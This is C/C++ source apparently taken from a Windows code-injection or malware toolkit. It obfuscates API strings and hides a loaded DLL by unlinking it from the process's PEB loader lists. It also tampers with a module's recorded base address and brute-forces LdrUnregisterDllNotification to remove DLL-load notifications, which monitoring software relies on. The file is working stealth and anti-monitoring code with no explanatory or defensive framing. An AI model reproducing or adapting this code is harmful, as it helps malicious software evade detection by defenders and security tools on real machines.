#include "inject.h"
#include "../ADVobfuscator/ADVobfuscator/MetaString4.h"
#include "antis.h"
#pragma GCC push_options
#pragma GCC optimize("O2")



typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_MODULE
{
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID BaseAddress;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA LoaderData;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID FastPebLockRoutine;
    PVOID FastPebUnlockRoutine;
    ULONG EnvironmentUpdateCount;
    PVOID* KernelCallbackTable;
    PVOID EventLogSection;
    PVOID EventLog;
    PVOID FreeList;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
    BYTE Spare2[0x4];
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID **ProcessHeaps;
    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    PVOID GdiDCAttributeList;
    PVOID LoaderLock;
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    ULONG OSBuildNumber;
    ULONG OSPlatformId;
    ULONG ImageSubSystem;
    ULONG ImageSubSystemMajorVersion;
    ULONG ImageSubSystemMinorVersion;
    ULONG GdiHandleBuffer[0x22];
    ULONG PostProcessInitRoutine;
    ULONG TlsExpansionBitmap;
    BYTE TlsExpansionBitmapBits[0x80];
    ULONG SessionId;
} PEB, *PPEB;




typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    VOID* DllBase;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

void swapBase()
{
PEB *pPeb=(PEB*)GetPEB();
PLDR_MODULE tableEntry;
tableEntry=(PLDR_MODULE)pPeb->LoaderData->InMemoryOrderModuleList.Flink;
tableEntry->BaseAddress = (MYWORD)tableEntry->BaseAddress + 0x100000;
}



int HideInList(HMODULE * hHide)
{
    HMODULE hHideModule;
    hHideModule=*hHide;
    PPEB pPeb = NULL;
    int ret=0;
    pPeb=(PPEB)GetPEB();

    PPEB_LDR_DATA pLdr = pPeb->LoaderData;
    PLDR_MODULE pModule = (PLDR_MODULE) pLdr->InLoadOrderModuleList.Flink;
    PLDR_MODULE pFirstModule = (PLDR_MODULE) &pLdr->InLoadOrderModuleList;
    LIST_ENTRY le;

    do
    {
        if (pModule->BaseAddress == (PVOID)hHideModule)
        {
            memcpy(&le,&pModule->InInitializationOrderModuleList,sizeof(le));
            pModule->InInitializationOrderModuleList.Blink->Flink = le.Flink;
            pModule->InInitializationOrderModuleList.Flink->Blink = le.Blink;

            memcpy(&le,&pModule->InLoadOrderModuleList,sizeof(le));
            pModule->InLoadOrderModuleList.Blink->Flink = le.Flink;
            pModule->InLoadOrderModuleList.Flink->Blink = le.Blink;

            memcpy(&le,&pModule->InMemoryOrderModuleList,sizeof(le));
            pModule->InMemoryOrderModuleList.Blink->Flink = le.Flink;
            pModule->InMemoryOrderModuleList.Flink->Blink = le.Blink;
            ret=1;
        }

        pModule = (PLDR_MODULE) pModule->InLoadOrderModuleList.Flink;
    } while(pFirstModule != pModule);
    //  asm  volatile( "pop %ebx");
    return ret;
}

void Hide_end()
{}


void fix_undll( MYWORD ret[])
{
    using namespace andrivet::ADVobfuscator;
    ret[0] = (MYWORD)GetModuleFunc(OBFUSCATED4("ntdll.dll"), OBFUSCATED4("LdrUnregisterDllNotification"));//GetProcAddress( GetModuleHandle( OBFUSCATED4("ntdll.dll") ), OBFUSCATED4("LdrUnregisterDllNotification") );
    ret[1] =  (MYWORD)GetProcAddress( GetModuleHandle(OBFUSCATED4("kernel32.dll" )), OBFUSCATED4("GetModuleHandleA"));
    ret[2] =  (MYWORD)GetProcAddress( GetModuleHandle(OBFUSCATED4("kernel32.dll" )), OBFUSCATED4("VirtualQuery"));

}

int find_undll(void *addr)
{
    void *p, *p2;//, *edr;
    // unsigned long int * swp;
    MYWORD *a, *swp;
    a=(MYWORD *)addr;
    MEMORY_BASIC_INFORMATION info;
    //IMAGE_OPTIONAL_HEADER pe;
    IMAGE_NT_HEADERS  *ai=NULL; //ImageNtHeaders(GetModuleHandle(NULL));
    tGetModuleHandle Get= (tGetModuleHandle) a[1];
    tVirtualQuery Virt = (tVirtualQuery) a[2];
    MYWORD base=(MYWORD)Get(NULL);
    MYWORD database;
    unsigned  int n;


    //memcpy(&ai,(void *)(base+0x80),sizeof(ai));
    p=(PVOID)base;
    Virt(p, &info, sizeof(info));
    for(n=sizeof(IMAGE_DOS_HEADER);n<info.RegionSize;n+=sizeof(MYWORD))
    {
      ai=(IMAGE_NT_HEADERS  *)(base+n);
      if(ai->Signature == 0x4550) //IMAGE_NT_SIGNATURE
          break;
    }

   if(ai->Signature != 0x4550)
       return -1;




#ifdef _WIN64
    database=base+ai->OptionalHeader.BaseOfCode;
#else
    database=base+ai->OptionalHeader.BaseOfData;
#endif

    MYWORD s=ai->OptionalHeader.SizeOfImage;
    tLdrUnregisterDllNotification LdrUnregisterDllNotification = (tLdrUnregisterDllNotification) a[0];
    for ( p = (PVOID)database; Virt(p, &info, sizeof(info)) == sizeof(info) && p<(PVOID)(base+s); p = (MYWORD)p+ info.RegionSize )
        if ((p!=NULL) && (info.Protect | PAGE_READWRITE ))
            //  {
            //   printf("[D] Last region 0x%x , size: %d \n",(unsigned int) p,(int) info.RegionSize);
            for(n=0;n<info.RegionSize;n+=sizeof(MYWORD))
            {
                swp=(MYWORD *)(( MYWORD)p+( MYWORD)n);
                p2=(PVOID)*swp;
                // if(p2>=ntbase)
                if(!LdrUnregisterDllNotification(p2))
                    return 1;
            }

    //}
    return 0;

}

void find_end(){}


